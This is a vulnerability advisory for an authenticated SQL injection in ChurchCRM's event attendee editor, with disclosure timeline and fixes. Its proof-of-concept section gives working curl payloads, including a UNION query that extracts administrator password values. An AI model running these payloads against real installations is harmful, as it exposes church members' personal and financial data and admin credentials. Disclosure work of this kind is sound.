# ChurchCRM — SQL Injection in EditEventAttendees.php (<= 5.18.0)

**Disclosure status:** Reported to vendor (GitHub Security Advisory GHSA-hxf4-3vhp-wqcq). No vendor response after 2+ weeks. Potentially addressed in v5.19.0 without acknowledgment.

**Affected product**
- ChurchCRM — versions **<= 5.18.0**

**Summary**
A critical SQL injection vulnerability in ChurchCRM's Event Attendee Editor allows authenticated users to execute arbitrary SQL commands against the MySQL database. The vulnerability enables complete database compromise, extraction of sensitive church member data, administrative credential theft, and potential system takeover through database manipulation.

**Required privileges**
- Any authenticated user account (no administrative privileges required)

**Impact**
- Complete database compromise with full read/write access
- Extraction of all church member personal and financial information
- Administrative credential theft enabling privilege escalation
- Data integrity attacks through modification or deletion of records
- Potential for persistent backdoor installation via database manipulation

**Technical Details**
The vulnerability exists in `EditEventAttendees.php` at line 60 where the `EID` (Event ID) parameter from `$_POST['EID']` is directly concatenated into SQL queries without validation or parameterized statements:

```php
$sSQL = 'SELECT person_id, per_LastName FROM event_attend JOIN person_per ON person_per.per_id = event_attend.person_id WHERE event_id = ' . $EventID . ' ORDER by per_LastName, per_FirstName';
```

The vulnerability occurs because:
- User input is directly concatenated into SQL query strings
- No input validation or sanitization is performed
- Parameterized queries are not used
- Raw SQL execution allows UNION-based data extraction

**Proof-of-Concept**

1. **Baseline Request** (Normal behavior):
   ```bash
   curl 'http://[target]/EditEventAttendees.php' \
     -X POST \
     -H 'Content-Type: application/x-www-form-urlencoded' \
     -H 'Cookie: CRM-[session-cookie]' \
     --data-raw 'EID=1&EName=test&EDesc=test&EDate=test&Action=test'
   ```
   **Result:** HTTP 200 (Normal response)

2. **SQL Injection Detection**:
   ```bash
   curl 'http://[target]/EditEventAttendees.php' \
     -X POST \
     -H 'Content-Type: application/x-www-form-urlencoded' \
     -H 'Cookie: CRM-[session-cookie]' \
     --data-raw 'EID=1'\'' OR 1=1-- &EName=test&EDesc=test&EDate=test&Action=test'
   ```
   **Result:** HTTP 500 (SQL Error - confirms injection vulnerability)

3. **UNION-based Data Extraction**:
   ```bash
   curl 'http://[target]/EditEventAttendees.php' \
     -X POST \
     -H 'Content-Type: application/x-www-form-urlencoded' \
     -H 'Cookie: CRM-[session-cookie]' \
     --data-raw 'EID=1 UNION SELECT 1,'\''EXTRACTED_DATA'\'' -- &EName=test&EDesc=test&EDate=test&Action=test'
   ```

4. **Database Credential Extraction**:
   ```bash
   curl 'http://[target]/EditEventAttendees.php' \
     -X POST \
     -H 'Content-Type: application/x-www-form-urlencoded' \
     -H 'Cookie: CRM-[session-cookie]' \
     --data-raw 'EID=1 UNION SELECT usr_PersonID, usr_Password FROM user_usr WHERE usr_admin=1 -- &EName=test&EDesc=test&EDate=test&Action=test'
   ```

**Confirmed results (observed)**
- SQL injection confirmed through error-based detection
- UNION injection successfully extracts data from database
- Administrative credentials accessible through user table queries
- Injected data appears directly in the attendee management interface
- Complete database schema enumeration possible

**Attack Scenarios**
1. **Complete Database Dump**: Extract all church member data, financial records, and system configuration
2. **Credential Harvesting**: Obtain administrator passwords for privilege escalation
3. **Data Manipulation**: Modify or delete critical church records and financial data
4. **Privacy Breach**: Access sensitive member information including contact details and donation history
5. **System Backdoor**: Insert malicious data or accounts for persistent access

**Mitigation / Workarounds**
- **Immediate**: Restrict access to event management functionality to trusted users only
- **Recommended vendor fixes**:
  - Implement parameterized queries for all database interactions
  - Add comprehensive input validation for all POST parameters
  - Use prepared statements with bound parameters
  - Implement proper error handling to prevent information disclosure
  - Add SQL injection detection and prevention mechanisms

**Disclosure timeline**
- 2025-09-26 — Reported via GitHub Security Advisory GHSA-hxf4-3vhp-wqcq
- 2025-10-05 — ChurchCRM v5.19.0 released with unspecified security improvements
- 2025-10-08 — No vendor response received; publishing advisory for CVE coordination

**References**
- GitHub Security Advisory: GHSA-hxf4-3vhp-wqcq
- ChurchCRM Event Attendees: `EditEventAttendees.php:60`

**Contact**
- Reporter: uartu0@gmail.com

---

This advisory documents a critical SQL injection vulnerability that allows any authenticated user to compromise the entire ChurchCRM database. The vulnerability provides access to sensitive church member information, financial records, and administrative credentials, representing a severe privacy and security risk for religious organizations using this software.